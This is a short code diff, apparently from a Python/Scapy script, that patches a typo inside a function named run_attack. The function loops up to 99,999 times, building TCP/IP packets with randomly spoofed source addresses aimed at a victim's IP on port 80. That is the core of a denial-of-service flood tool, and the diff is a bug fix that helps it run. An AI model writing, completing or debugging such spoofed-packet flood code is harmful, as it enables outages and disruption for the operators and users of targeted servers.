@@ -22,7 +22,7 @@ def run_attack(victim):
     port = 80
     for x in range(0, 99999):
         packetIP = IP()
-        paketIP.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
+        packetIP.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
         packetIP.dst = wictim.ip_addr
         packetTCP = TCP()
         packetIP.sport = RandShort()
